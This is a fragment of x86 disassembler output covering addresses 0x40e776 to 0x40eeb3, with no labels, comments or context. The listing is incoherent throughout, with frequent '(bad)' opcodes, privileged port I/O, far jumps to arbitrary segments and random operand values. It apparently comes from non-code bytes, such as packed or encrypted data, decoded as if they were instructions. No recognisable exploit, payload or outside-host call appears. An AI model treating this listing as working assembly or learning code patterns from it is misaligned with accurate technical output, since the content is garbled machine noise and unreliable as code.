  40e776:	add    dl,BYTE PTR [eax+ecx*8+0x43]
  40e77a:	out    0x5d,al
  40e77c:	out    dx,eax
  40e77d:	(bad)  [esi]
  40e77f:	add    BYTE PTR [ebx],dl
  40e781:	sbb    ebx,ebx
  40e783:	out    0x31,al
  40e785:	sbb    edi,DWORD PTR [ecx]
  40e787:	test   al,0xf
  40e789:	mov    al,BYTE PTR [esi+0x7cef659a]
  40e78f:	ret    0x7259
  40e792:	dec    edx
  40e793:	out    0x5b,al
  40e795:	shl    DWORD PTR [ebx-0x12],0x5f
  40e799:	xchg   ebp,eax
  40e79a:	(bad)  
  40e79b:	push   edx
  40e79c:	cwde   
  40e79d:	push   ss
  40e79e:	sti    
  40e79f:	pop    esi
  40e7a0:	pop    ebp
  40e7a1:	jb     0x40e820
  40e7a3:	retf   
  40e7a4:	test   BYTE PTR [esi-0x72],0x9a
  40e7a8:	aas    
  40e7a9:	in     eax,dx
  40e7aa:	add    BYTE PTR [ecx+esi*2],0x66
  40e7ae:	int3   
  40e7af:	xchg   ebx,eax
  40e7b0:	mov    eax,0x114d8dfc
  40e7b5:	cli    
  40e7b6:	inc    esp
  40e7b7:	push   edi
  40e7b8:	xchg   DWORD PTR [ebx+0x6c094142],esi
  40e7be:	xchg   ecx,eax
  40e7bf:	pushf  
  40e7c0:	scas   al,BYTE PTR es:[edi]
  40e7c1:	sub    DWORD PTR [ebp-0x5e],0x1b
  40e7c5:	add    dh,BYTE PTR [edx+edx*4]
  40e7c8:	sbb    ebx,DWORD PTR [esi+0x67a88e08]
  40e7ce:	sub    eax,0xd826808b
  40e7d3:	sub    BYTE PTR [ebp+0x5c],bl
  40e7d6:	mov    edi,0xc098e9b4
  40e7db:	and    eax,0x9b1d8ce
  40e7e0:	repz out 0xca,eax
  40e7e3:	test   BYTE PTR [eax+ecx*8+0x19],ch
  40e7e7:	push   es
  40e7e8:	mov    cl,BYTE PTR [ebx]
  40e7ea:	adc    BYTE PTR [ebx+0x18],ah
  40e7ed:	out    dx,al
  40e7ee:	aad    0xb2
  40e7f0:	dec    ebp
  40e7f1:	sub    bl,dh
  40e7f3:	(bad)  
  40e7f4:	aad    0x11
  40e7f6:	jae    0x40e859
  40e7f8:	lods   al,BYTE PTR ds:[esi]
  40e7f9:	sahf   
  40e7fa:	cmp    cl,BYTE PTR ds:0x741582fd
  40e800:	pop    ebx
  40e801:	das    
  40e802:	sub    ecx,DWORD PTR [edx-0x34]
  40e805:	add    BYTE PTR [ebx],0x20
  40e808:	icebp  
  40e809:	iret   
  40e80a:	outs   dx,DWORD PTR ds:[esi]
  40e80b:	jmp    0x27fb:0x60a78bbc
  40e812:	inc    esp
  40e813:	pop    eax
  40e814:	icebp  
  40e815:	xchg   ebp,eax
  40e816:	mov    eax,0x1b9169e0
  40e81b:	xor    BYTE PTR [edi],dl
  40e81d:	cmp    ebp,esi
  40e81f:	inc    DWORD PTR [ebx+0x6f317deb]
  40e825:	push   cs
  40e826:	cmc    
  40e827:	daa    
  40e828:	sbb    bh,bl
  40e82a:	cli    
  40e82b:	add    DWORD PTR [bx+0x1694],0x283b3d4a
  40e834:	pop    ss
  40e835:	call   0x6c033ba9
  40e83a:	cmp    eax,0x9bd111f1
  40e83f:	dec    ebx
  40e840:	dec    ebx
  40e841:	mov    edx,0xbdcb9d35
  40e846:	push   es
  40e847:	push   edi
  40e848:	mov    BYTE PTR [edx+0x2a9200f7],cl
  40e84e:	inc    ecx
  40e84f:	repnz outs dx,BYTE PTR ds:[esi]
  40e851:	jge    0x40e87a
  40e853:	mov    bh,0x4e
  40e855:	inc    ebp
  40e856:	xchg   esi,eax
  40e857:	outs   dx,BYTE PTR ds:[esi]
  40e858:	(bad)  
  40e859:	fst    st(3)
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	mov    esi,0x88f2975f
  40e861:	stc    
  40e862:	dec    edx
  40e863:	jno    0x40e860
  40e865:	cmp    DWORD PTR [edx+ecx*8+0x2b],ebp
  40e869:	shl    BYTE PTR [esi-0x1aaf76de],0x6f
  40e870:	sub    al,0x27
  40e872:	jne    0x40e859
  40e874:	and    BYTE PTR [esi-0x23b7025c],0x1a
  40e87b:	add    esi,DWORD PTR [edi+0x2d]
  40e87e:	or     al,0x47
  40e880:	and    DWORD PTR [eax],ebp
  40e882:	mov    DWORD PTR [ebp-0x7f],esp
  40e885:	jecxz  0x40e828
  40e887:	jbe    0x40e8f7
  40e889:	mov    ch,ah
  40e88b:	cdq    
  40e88c:	cli    
  40e88d:	ss out 0xf8,al
  40e890:	cmp    DWORD PTR [ecx+0x79],eax
  40e893:	cli    
  40e894:	mov    gs:0x8cb38151,al
  40e89a:	and    esi,edx
  40e89c:	es aas 
  40e89e:	jl     0x40e8aa
  40e8a0:	dec    edx
  40e8a1:	sub    eax,0xe95c2105
  40e8a6:	js     0x40e869
  40e8a8:	retf   
  40e8a9:	idiv   DWORD PTR [eax+0xa318f2]
  40e8af:	adc    al,0xba
  40e8b1:	icebp  
  40e8b2:	jno    0x40e896
  40e8b4:	outs   dx,BYTE PTR ds:[esi]
  40e8b5:	or     eax,0x794000fe
  40e8ba:	sbb    al,0xec
  40e8bc:	loopne 0x40e8fd
  40e8be:	dec    ebp
  40e8bf:	cmp    eax,0x2d9d0036
  40e8c4:	outs   dx,BYTE PTR ds:[esi]
  40e8c5:	loope  0x40e88d
  40e8c7:	out    dx,al
  40e8c8:	jae    0x40e8a4
  40e8ca:	push   eax
  40e8cb:	mov    cl,0x73
  40e8cd:	jmp    0xcc6acf0e
  40e8d2:	outs   dx,DWORD PTR ds:[esi]
  40e8d3:	adc    eax,0x31bcd80a
  40e8d8:	arpl   WORD PTR [ecx+0x5ba5c34c],bp
  40e8de:	push   esp
  40e8df:	je     0x40e956
  40e8e1:	inc    edx
  40e8e2:	fldcw  WORD PTR [ebx+eiz*8-0x4850300b]
  40e8e9:	into   
  40e8ea:	cmc    
  40e8eb:	cmp    eax,0x592b953b
  40e8f0:	idiv   DWORD PTR [ebp+0x4654f35d]
  40e8f6:	cmp    al,0x9a
  40e8f8:	mov    ah,BYTE PTR [ecx+esi*1-0x7a]
  40e8fc:	into   
  40e8fd:	out    dx,eax
  40e8fe:	rcl    DWORD PTR [esp+edi*4],0x7
  40e902:	fimul  WORD PTR [ebp+0x3d]
  40e905:	dec    ecx
  40e906:	(bad)  
  40e907:	push   esp
  40e908:	mov    dh,0xb6
  40e90a:	cld    
  40e90b:	xor    al,0x7
  40e90d:	dec    edx
  40e90e:	add    eax,0x9cfde08e
  40e913:	xlat   BYTE PTR fs:[ebx]
  40e915:	jne    0x40e97e
  40e917:	lds    ecx,FWORD PTR ds:0xfbfebc1c
  40e91d:	lahf   
  40e91e:	sti    
  40e91f:	pusha  
  40e920:	rol    eax,cl
  40e922:	sbb    dh,bh
  40e924:	mov    esp,0x9a5ac99d
  40e929:	push   esi
  40e92a:	and    ecx,DWORD PTR [bx+si]
  40e92d:	jge    0x40e8fb
  40e92f:	jle    0x40e920
  40e931:	mov    dl,0xa6
  40e933:	loope  0x40e8d2
  40e935:	ss retf 
  40e937:	dec    edi
  40e938:	test   eax,0x4b1eec73
  40e93e:	push   ss
  40e93f:	push   edx
  40e940:	out    0x5b,al
  40e942:	mov    ebx,0xf4a33d97
  40e947:	add    cl,BYTE PTR [esi]
  40e949:	fnstsw WORD PTR [edi-0x2e]
  40e94c:	pushf  
  40e94d:	or     al,0x9e
  40e94f:	rcl    bl,cl
  40e951:	dec    esp
  40e952:	neg    DWORD PTR [edi-0x1d31edb7]
  40e958:	imul   esp,DWORD PTR ds:0xc3fcecb2,0x321f7381
  40e962:	adc    BYTE PTR [edx+ebp*1+0xe],0xcd
  40e967:	push   ecx
  40e968:	add    DWORD PTR [edx-0x4ae7123f],edi
  40e96e:	int3   
  40e96f:	nop
  40e970:	jns    0x40e908
  40e972:	aaa    
  40e973:	and    ah,al
  40e975:	jae    0x40e9cc
  40e977:	inc    ebx
  40e978:	jecxz  0x40e911
  40e97a:	push   ebp
  40e97b:	push   ebx
  40e97c:	sbb    edx,DWORD PTR [edx+esi*8+0x4473755b]
  40e983:	ins    DWORD PTR es:[edi],dx
  40e984:	fisttp WORD PTR [ebx+0x439622b3]
  40e98a:	repnz data16 add bl,bh
  40e98e:	pop    esi
  40e98f:	ficomp WORD PTR [ebx]
  40e991:	into   
  40e992:	lock push 0x462fbe29
  40e998:	mov    bl,ch
  40e99a:	or     BYTE PTR [edx+0xc],dh
  40e99d:	cdq    
  40e99e:	jns    0x40ea1c
  40e9a0:	mov    ds:0x1b51516c,eax
  40e9a5:	xchg   DWORD PTR [ebp-0x5],eax
  40e9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9a9:	and    ebx,DWORD PTR [ebp+0x24]
  40e9ac:	cmp    eax,0x1f8b5611
  40e9b1:	xchg   ebx,eax
  40e9b2:	(bad)  
  40e9b3:	clc    
  40e9b4:	pop    ecx
  40e9b5:	test   DWORD PTR [ecx+ecx*8],ecx
  40e9b8:	push   0xffffffec
  40e9ba:	fstp   QWORD PTR [esi+0x0]
  40e9bd:	adc    bl,BYTE PTR [edi+0x51]
  40e9c0:	stos   BYTE PTR es:[edi],al
  40e9c1:	inc    edi
  40e9c2:	jl     0x40e991
  40e9c4:	pushf  
  40e9c5:	dec    esp
  40e9c6:	mov    ebp,0x73a16229
  40e9cb:	jns    0x40e9ca
  40e9cd:	add    BYTE PTR [eax+eax*4],0x1d
  40e9d1:	cmc    
  40e9d2:	cmp    al,0x82
  40e9d4:	mov    ebx,0xa59b0464
  40e9d9:	fxam   
  40e9db:	and    BYTE PTR [ebp+0x2257c3b],ch
  40e9e1:	ins    BYTE PTR es:[edi],dx
  40e9e2:	mov    bh,0xd7
  40e9e4:	push   edx
  40e9e5:	push   ebp
  40e9e6:	jl     0x40ea0d
  40e9e8:	pop    eax
  40e9e9:	js     0x40e973
  40e9eb:	sbb    DWORD PTR [edi+edi*8+0x4ae548a3],edx
  40e9f2:	pop    edi
  40e9f3:	aas    
  40e9f4:	dec    edi
  40e9f5:	js     0x40ea36
  40e9f7:	push   eax
  40e9f8:	sti    
  40e9f9:	fcmovu st,st(1)
  40e9fb:	jb     0x40e9a3
  40e9fd:	or     ecx,eax
  40e9ff:	cmp    ebx,0x9a1d033f
  40ea05:	adc    edx,esp
  40ea07:	cmp    BYTE PTR [ebp+0x27],bh
  40ea0a:	cmp    ch,BYTE PTR [edx-0x7c2ec890]
  40ea10:	inc    edx
  40ea11:	call   0x8cac5451
  40ea16:	sbb    DWORD PTR [ecx-0x3575261],0x53
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	mov    ah,0xfb
  40ea20:	pop    edx
  40ea21:	adc    eax,0x751bf72a
  40ea26:	pop    ss
  40ea27:	(bad)  
  40ea28:	ror    BYTE PTR [ebx+0x6f],1
  40ea2b:	fistp  DWORD PTR [ecx+0x56]
  40ea2e:	gs jne 0x40eaa9
  40ea31:	iret   
  40ea32:	jo     0x40e9e8
  40ea34:	dec    edi
  40ea35:	adc    eax,0x5f994de5
  40ea3a:	mov    ebp,0xfae4b27
  40ea3f:	aas    
  40ea40:	mov    eax,0x6e7fb54b
  40ea45:	fs push ebx
  40ea47:	sbb    DWORD PTR ds:0xb13c94db,esi
  40ea4d:	ret    
  40ea4e:	inc    ecx
  40ea4f:	push   cs
  40ea50:	mov    al,0xd1
  40ea52:	mov    edi,0x36f823c9
  40ea57:	daa    
  40ea58:	jo     0x40ea45
  40ea5a:	cmp    al,0x49
  40ea5c:	int    0x6a
  40ea5e:	dec    esp
  40ea5f:	add    bh,BYTE PTR [ecx]
  40ea61:	loop   0x40ea20
  40ea63:	jge    0x40ea5d
  40ea65:	lods   al,BYTE PTR ds:[esi]
  40ea66:	xor    DWORD PTR [ecx],eax
  40ea68:	sahf   
  40ea69:	jge    0x40ead8
  40ea6b:	sahf   
  40ea6c:	mov    esi,0x6abe4e40
  40ea71:	mov    esp,0x53d89e86
  40ea76:	icebp  
  40ea77:	push   edi
  40ea78:	into   
  40ea79:	and    eax,0x5f93bacf
  40ea7e:	rcl    DWORD PTR [esi],cl
  40ea80:	pusha  
  40ea81:	push   esp
  40ea82:	and    BYTE PTR [edi+0x19c9a983],bh
  40ea88:	in     al,0xa0
  40ea8a:	lods   eax,DWORD PTR ds:[esi]
  40ea8b:	gs into 
  40ea8d:	sub    ebp,esp
  40ea8f:	jmp    0x76b59540
  40ea94:	mov    ecx,0x4ba2ae3
  40ea99:	add    cl,bh
  40ea9b:	inc    ecx
  40ea9c:	mov    esi,DWORD PTR ss:[esi+0x409604b0]
  40eaa3:	and    al,0xe3
  40eaa5:	pop    ebx
  40eaa6:	push   ss
  40eaa7:	pop    esp
  40eaa8:	mov    ds,WORD PTR [edx]
  40eaaa:	pop    ebx
  40eaab:	xor    BYTE PTR [eax-0x13],bl
  40eaae:	nop
  40eaaf:	aam    0x31
  40eab1:	in     al,dx
  40eab2:	mov    esp,0x9b9f050b
  40eab7:	push   ebx
  40eab8:	sbb    eax,0xb465dfb5
  40eabd:	xchg   ebp,eax
  40eabe:	or     al,dl
  40eac0:	push   edi
  40eac1:	test   eax,0x47a05fa
  40eac6:	cmc    
  40eac7:	push   cs
  40eac8:	sbb    DWORD PTR [edx],0xffffff88
  40eacb:	sti    
  40eacc:	or     eax,0xb24fadf5
  40ead1:	ss cli 
  40ead3:	sbb    DWORD PTR ss:[ebx+0x3e],0x3c
  40ead8:	push   cs
  40ead9:	and    BYTE PTR [esi+ebx*1+0x5c],dl
  40eadd:	sbb    BYTE PTR [ebx],ah
  40eadf:	arpl   WORD PTR [edx+0x151da703],dx
  40eae5:	cmp    BYTE PTR [edi-0x44],dl
  40eae8:	lods   al,BYTE PTR ds:[esi]
  40eae9:	aas    
  40eaea:	(bad)  [ebp+edi*2+0x70809406]
  40eaf1:	push   edx
  40eaf2:	repnz enter 0xe4fd,0x8f
  40eaf7:	rep lods eax,DWORD PTR ds:[esi]
  40eaf9:	ins    DWORD PTR es:[edi],dx
  40eafa:	(bad)  
  40eafb:	sbb    dl,BYTE PTR [ebx-0x25]
  40eafe:	adc    BYTE PTR [ebp+0x337e1723],dh
  40eb04:	pop    esp
  40eb05:	imul   edi,DWORD PTR [edx-0x39c9471],0x1e
  40eb0c:	mov    al,0xb
  40eb0e:	les    esp,FWORD PTR [ebx+ebx*8-0x606abbba]
  40eb15:	and    eax,0x54455b7f
  40eb1a:	cdq    
  40eb1b:	les    ecx,FWORD PTR [ebp+0x700e27a9]
  40eb21:	addr16 aaa 
  40eb23:	int3   
  40eb24:	add    ah,ch
  40eb26:	data16 sub BYTE PTR [ebp-0xfd488da],dl
  40eb2d:	dec    ebp
  40eb2e:	inc    esp
  40eb2f:	or     al,dl
  40eb31:	popf   
  40eb32:	add    eax,0x2428acb4
  40eb37:	fidivr WORD PTR [ecx+0x7dbdb094]
  40eb3d:	xchg   ebx,eax
  40eb3e:	sbb    al,0x93
  40eb40:	push   0xfffffffe
  40eb42:	xlat   BYTE PTR ds:[ebx]
  40eb43:	sub    ecx,DWORD PTR [esi+0x8284cea]
  40eb49:	jmp    0x40eba3
  40eb4b:	mov    bh,0x72
  40eb4d:	cmp    ebp,eax
  40eb4f:	ror    BYTE PTR [ebx-0x21],1
  40eb52:	mov    dh,0xc3
  40eb54:	xchg   esp,eax
  40eb55:	xchg   bh,bh
  40eb57:	jb     0x40eb3a
  40eb59:	popf   
  40eb5a:	mov    ebx,0x7ff6b064
  40eb5f:	or     DWORD PTR [edi],0xffffffc1
  40eb62:	mov    dl,0xfc
  40eb64:	sbb    bh,BYTE PTR [esi-0x67]
  40eb67:	push   ds
  40eb68:	sub    al,0x66
  40eb6a:	imul   edi,DWORD PTR [eax-0x1406e603],0xffffffbe
  40eb71:	inc    esp
  40eb72:	or     esi,DWORD PTR [edx+0x47cfd898]
  40eb78:	in     al,0x7c
  40eb7a:	push   edi
  40eb7b:	in     al,dx
  40eb7c:	sub    al,BYTE PTR [edi+0x27a35cbc]
  40eb82:	(bad)  
  40eb83:	and    BYTE PTR [esi+0x2d],bh
  40eb86:	mov    al,ds:0x1855582c
  40eb8b:	ret    0x8450
  40eb8e:	pop    ebp
  40eb8f:	jb     0x40eb49
  40eb91:	scas   al,BYTE PTR es:[edi]
  40eb92:	jo     0x40eb16
  40eb94:	dec    esi
  40eb95:	mov    ah,0xae
  40eb97:	ret    0x4805
  40eb9a:	fmul   st(2),st
  40eb9c:	cmp    al,0x18
  40eb9e:	sar    esp,cl
  40eba0:	test   DWORD PTR [edi],ebx
  40eba2:	mov    edi,0xa57e5d59
  40eba7:	mov    ah,0xbd
  40eba9:	xchg   ecx,eax
  40ebaa:	pop    esp
  40ebab:	mov    dh,0x61
  40ebad:	call   0xe923213b
  40ebb2:	scas   al,BYTE PTR es:[edi]
  40ebb3:	fidiv  WORD PTR [esi]
  40ebb5:	and    eax,0x62c31357
  40ebba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbb:	int    0x6e
  40ebbd:	repz es jo 0x40eb53
  40ebc1:	or     cl,al
  40ebc3:	addr16 js 0x40ebcf
  40ebc6:	xor    DWORD PTR [eax],ebp
  40ebc8:	sbb    BYTE PTR [ebx-0x9],ch
  40ebcb:	mov    ah,0x4f
  40ebcd:	mov    cs,WORD PTR [ebx-0xa]
  40ebd0:	cli    
  40ebd1:	mov    dl,0xe1
  40ebd3:	push   cs
  40ebd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebd5:	mov    ah,0x97
  40ebd7:	fld    QWORD PTR [ebx-0x3e]
  40ebda:	jo     0x40eb6e
  40ebdc:	dec    esi
  40ebdd:	gs stos BYTE PTR es:[edi],al
  40ebdf:	push   cs
  40ebe0:	push   ds
  40ebe1:	into   
  40ebe2:	jnp    0x40ec2b
  40ebe4:	adc    BYTE PTR [eax-0x1f953bd9],bl
  40ebea:	or     esp,esi
  40ebec:	mov    bl,0x25
  40ebee:	stos   DWORD PTR es:[edi],eax
  40ebef:	repz push ecx
  40ebf1:	retf   
  40ebf2:	iret   
  40ebf3:	aam    0x88
  40ebf5:	in     al,0xcb
  40ebf7:	jge    0x40ebca
  40ebf9:	test   DWORD PTR es:[ecx],esp
  40ebfc:	iret   
  40ebfd:	push   cs
  40ebfe:	inc    DWORD PTR [edi-0x7ba97969]
  40ec04:	pop    edx
  40ec05:	pop    edi
  40ec06:	test   eax,0x3afb9c68
  40ec0b:	pop    edi
  40ec0c:	adc    bl,cl
  40ec0e:	mov    eax,0xe656161
  40ec13:	stos   DWORD PTR es:[edi],eax
  40ec14:	inc    esp
  40ec15:	into   
  40ec16:	cmp    DWORD PTR [edi+0x45da9bf6],esi
  40ec1c:	inc    esi
  40ec1d:	pop    ebp
  40ec1e:	rcl    eax,cl
  40ec20:	fs in  al,0x32
  40ec23:	push   esi
  40ec24:	or     al,0x42
  40ec26:	imul   ebx,DWORD PTR [eax],0x8c04519a
  40ec2c:	or     esi,DWORD PTR [edi+0x3f90ccdc]
  40ec32:	jnp    0x40ebc0
  40ec34:	ror    DWORD PTR [eax+eax*8-0x65],cl
  40ec38:	fsubr  QWORD PTR [eiz*1+0x2a0bbf42]
  40ec3f:	jg     0x40ec8e
  40ec41:	or     BYTE PTR [esi],dh
  40ec43:	aas    
  40ec44:	mov    ds:0x151c5b15,eax
  40ec49:	ins    DWORD PTR es:[edi],dx
  40ec4a:	xor    eax,0x5a9e9a88
  40ec4f:	scas   eax,DWORD PTR es:[edi]
  40ec50:	icebp  
  40ec51:	test   DWORD PTR ss:[esi-0x4f97c724],ebp
  40ec58:	mov    dl,0x59
  40ec5a:	stos   DWORD PTR es:[edi],eax
  40ec5b:	xchg   ecx,eax
  40ec5c:	push   ebp
  40ec5d:	xchg   ebp,eax
  40ec5e:	test   ah,dh
  40ec60:	pop    eax
  40ec61:	dec    ecx
  40ec62:	ret    
  40ec63:	pop    es
  40ec64:	push   ss
  40ec65:	push   ebp
  40ec66:	push   ecx
  40ec67:	or     edi,DWORD PTR [edx]
  40ec69:	repz and DWORD PTR [esi-0x32],ebp
  40ec6d:	jp     0x40ec43
  40ec6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec70:	mov    bh,0xa8
  40ec72:	jg     0x40ec67
  40ec74:	and    al,0xa8
  40ec76:	push   cs
  40ec77:	data16 fwait
  40ec79:	mov    esi,0x1142ffb0
  40ec7e:	push   ds
  40ec7f:	(bad)  
  40ec80:	sub    al,0x9e
  40ec82:	cdq    
  40ec83:	adc    BYTE PTR [esi+0x60],bl
  40ec86:	sub    BYTE PTR ds:[ebp-0x1b],dh
  40ec8a:	sbb    bl,dl
  40ec8c:	sbb    edx,DWORD PTR [ecx]
  40ec8e:	sub    BYTE PTR [edi],ch
  40ec90:	iret   
  40ec91:	xchg   esi,eax
  40ec92:	xchg   ecx,eax
  40ec93:	mov    ebp,0xc06301fb
  40ec98:	popa   
  40ec99:	push   ebx
  40ec9a:	les    esp,FWORD PTR [ebp-0x72cfcbf3]
  40eca0:	cld    
  40eca1:	ret    
  40eca2:	les    esp,FWORD PTR [esi-0x5889cb7]
  40eca8:	outs   dx,BYTE PTR ds:[esi]
  40eca9:	push   cs
  40ecaa:	jmp    0xfd1de0e8
  40ecaf:	pop    ds
  40ecb0:	imul   ebx,DWORD PTR [edi],0x2024ee36
  40ecb6:	push   es
  40ecb7:	inc    eax
  40ecb8:	pop    es
  40ecb9:	int    0x94
  40ecbb:	sahf   
  40ecbc:	mov    BYTE PTR es:[esi],ah
  40ecbf:	mov    al,0xdf
  40ecc1:	rol    DWORD PTR [edi-0x19],0x7f
  40ecc5:	xor    eax,0x902a4129
  40ecca:	dec    esp
  40eccb:	imul   edx,eax,0xfbea4b15
  40ecd1:	cli    
  40ecd2:	sbb    BYTE PTR [edx-0x47],bh
  40ecd5:	cmc    
  40ecd6:	ror    ecx,0x91
  40ecd9:	ins    DWORD PTR es:[edi],dx
  40ecda:	ret    
  40ecdb:	jb     0x40ec91
  40ecdd:	popa   
  40ecde:	inc    esp
  40ecdf:	xchg   eax,esi
  40ece1:	push   ebp
  40ece2:	stc    
  40ece3:	stos   BYTE PTR es:[edi],al
  40ece4:	sbb    bh,al
  40ece6:	(bad)
  40ece9:	or     al,0xfe
  40eceb:	mov    al,ds:0x85083501
  40ecf0:	mov    bl,0x5c
  40ecf2:	pop    esp
  40ecf3:	ret    0x42a7
  40ecf6:	adc    BYTE PTR [edi-0x37],bh
  40ecf9:	pushf  
  40ecfa:	add    eax,0x6d37cad6
  40ecff:	sbb    DWORD PTR [ecx+0x6f],ecx
  40ed02:	clc    
  40ed03:	mov    eax,0x82533fb1
  40ed08:	and    DWORD PTR [edi-0xc],0x18
  40ed0c:	xchg   esi,eax
  40ed0d:	pop    ebp
  40ed0e:	adc    BYTE PTR [edx+0x5a],cl
  40ed11:	shr    DWORD PTR [edx+0x63],1
  40ed14:	push   esp
  40ed15:	leave  
  40ed16:	mov    al,ds:0x4995d51
  40ed1b:	cmc    
  40ed1c:	jae    0x40ecdf
  40ed1e:	inc    ebx
  40ed1f:	cdq    
  40ed20:	or     eax,0x3a8ef093
  40ed25:	mov    ch,0x50
  40ed27:	je     0x40ed6e
  40ed29:	adc    DWORD PTR [ebp-0x48bfabef],edi
  40ed2f:	and    al,0xe8
  40ed31:	inc    esp
  40ed32:	test   DWORD PTR [edi-0x4d0c88f5],0xedb353ab
  40ed3c:	addr16 cmp eax,0xb3c4996a
  40ed42:	dec    ecx
  40ed43:	sahf   
  40ed44:	dec    esp
  40ed45:	mov    edx,0xcf240da
  40ed4a:	rol    DWORD PTR [edx-0x36c6a898],0x14
  40ed51:	sbb    DWORD PTR [esi-0x58],0xffffffb7
  40ed55:	sbb    dh,BYTE PTR [edx]
  40ed57:	(bad)  
  40ed58:	jecxz  0x40ed8a
  40ed5a:	into   
  40ed5b:	xor    cl,dh
  40ed5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed5e:	fbstp  TBYTE PTR [eax+0x47d40dea]
  40ed64:	in     eax,dx
  40ed65:	daa    
  40ed66:	aaa    
  40ed67:	shl    DWORD PTR [eax+edi*2-0x27],0x26
  40ed6c:	push   0x6d
  40ed6e:	dec    esp
  40ed6f:	ss xor eax,0x51523f11
  40ed75:	jg     0x40edeb
  40ed77:	stos   DWORD PTR es:[edi],eax
  40ed78:	leave  
  40ed79:	call   0x6201:0x8246ba0e
  40ed80:	sbb    DWORD PTR [edi+0x6a],0x6
  40ed84:	adc    esi,DWORD PTR [ebp-0x2a]
  40ed87:	and    al,0xa2
  40ed89:	call   0xafe:0xb3c84d0f
  40ed90:	lahf   
  40ed91:	mov    esp,DWORD PTR [ecx]
  40ed93:	nop
  40ed94:	mov    DWORD PTR [ebx+0x6f],eax
  40ed97:	sbb    al,0x8b
  40ed99:	or     al,0xd5
  40ed9b:	or     ebx,esp
  40ed9d:	pushf  
  40ed9e:	lock sub esi,DWORD PTR [eax]
  40eda1:	iret   
  40eda2:	push   ebx
  40eda3:	test   al,0x2f
  40eda5:	(bad)  
  40eda6:	aad    0x4e
  40eda8:	fmul   DWORD PTR [esi-0x4c228f9]
  40edae:	mov    al,0x85
  40edb0:	mov    ch,0x3d
  40edb2:	push   eax
  40edb3:	imul   ebx,DWORD PTR [esi],0xfffffff6
  40edb6:	scas   al,BYTE PTR es:[edi]
  40edb7:	sub    ebp,DWORD PTR [ebx-0x694db0e2]
  40edbd:	fs iret 
  40edbf:	inc    edi
  40edc0:	daa    
  40edc1:	sub    ah,BYTE PTR [ebx-0x148e7c42]
  40edc7:	std    
  40edc8:	pop    ebp
  40edc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edca:	fimul  WORD PTR [ebp-0x18]
  40edcd:	fsub   DWORD PTR [edi+0x401ef6be]
  40edd3:	inc    eax
  40edd4:	out    dx,al
  40edd5:	mov    ecx,0x9dbc3d8b
  40edda:	sub    bh,BYTE PTR [eax-0x18]
  40eddd:	cld    
  40edde:	stc    
  40eddf:	mov    eax,ds:0xab7fffbc
  40ede4:	cmp    ch,bh
  40ede6:	adc    BYTE PTR [esi],0xd
  40ede9:	leave  
  40edea:	icebp  
  40edeb:	imul   ebx,ebp,0xffffffea
  40edee:	cmp    esi,DWORD PTR [ebx-0x36]
  40edf1:	popa   
  40edf2:	in     al,dx
  40edf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edf4:	iret   
  40edf5:	cmpps  xmm2,XMMWORD PTR [edx-0x19],0xfa
  40edfa:	(bad)  
  40edfb:	ret    
  40edfc:	pop    ds
  40edfd:	inc    ecx
  40edfe:	dec    edi
  40edff:	pop    esp
  40ee00:	fst    QWORD PTR [ebx+0x14]
  40ee03:	cmp    BYTE PTR [edx],bl
  40ee05:	dec    ebp
  40ee06:	int3   
  40ee07:	call   0xeff16382
  40ee0c:	mov    eax,0x7516a823
  40ee11:	enter  0xb736,0x53
  40ee15:	sbb    bh,BYTE PTR [eax]
  40ee17:	inc    ecx
  40ee18:	imul   esp,ebx,0xfffffff5
  40ee1b:	pop    edi
  40ee1c:	enter  0xf393,0x91
  40ee20:	mov    ebx,0xa1253b35
  40ee25:	add    ebx,edi
  40ee27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee28:	jae    0x40ee57
  40ee2a:	aas    
  40ee2b:	mov    ebp,0xeffbc5ae
  40ee30:	sub    dh,ah
  40ee32:	mov    esp,0x4bd46f39
  40ee37:	jle    0x40ee0b
  40ee39:	cs or  ch,0xdd
  40ee3d:	fisubr DWORD PTR [eax+0x50]
  40ee40:	push   ecx
  40ee41:	xor    esp,DWORD PTR [edi]
  40ee43:	mov    bh,0x8c
  40ee45:	das    
  40ee46:	inc    esp
  40ee47:	js     0x40eec4
  40ee49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee4a:	popa   
  40ee4b:	loopne 0x40eea4
  40ee4d:	inc    eax
  40ee4e:	mov    cs,WORD PTR [edi]
  40ee50:	inc    esp
  40ee51:	or     eax,0xab4c6f5c
  40ee56:	ror    BYTE PTR [ebp+0x4b194928],cl
  40ee5c:	mov    bl,BYTE PTR [eax+0x67aca1]
  40ee62:	gs sti 
  40ee64:	(bad)  
  40ee65:	adc    bl,al
  40ee67:	or     al,0xd8
  40ee69:	xlat   BYTE PTR ds:[ebx]
  40ee6a:	jl     0x40ee5b
  40ee6c:	sbb    BYTE PTR [eax-0x261bb255],bh
  40ee72:	test   al,0xb9
  40ee74:	nop
  40ee75:	pop    ebx
  40ee76:	ror    DWORD PTR [ebx],1
  40ee78:	jp     0x40ee15
  40ee7a:	jl     0x40ee1f
  40ee7c:	outs   dx,BYTE PTR ds:[esi]
  40ee7d:	inc    BYTE PTR [edi]
  40ee7f:	aas    
  40ee80:	addr16 add ah,bl
  40ee83:	popf   
  40ee84:	stos   BYTE PTR es:[edi],al
  40ee85:	xor    al,0x97
  40ee87:	addr16 jmp 0x40ef04
  40ee8a:	imul   ecx,DWORD PTR [ebp+0x10d9dafc],0x25
  40ee91:	xchg   ebp,eax
  40ee92:	sbb    BYTE PTR [esi-0x292861ef],cl
  40ee98:	cs mov cl,0x63
  40ee9b:	aas    
  40ee9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee9d:	(bad)  
  40ee9e:	xchg   esp,eax
  40ee9f:	jge    0x40ee62
  40eea1:	jmp    0x3996a811
  40eea6:	cwde   
  40eea7:	enter  0x8999,0x1f
  40eeab:	outs   dx,BYTE PTR ds:[esi]
  40eeac:	es imul ebx,ebx,0xc883dc9a
  40eeb3:	mov    ch,0xb0
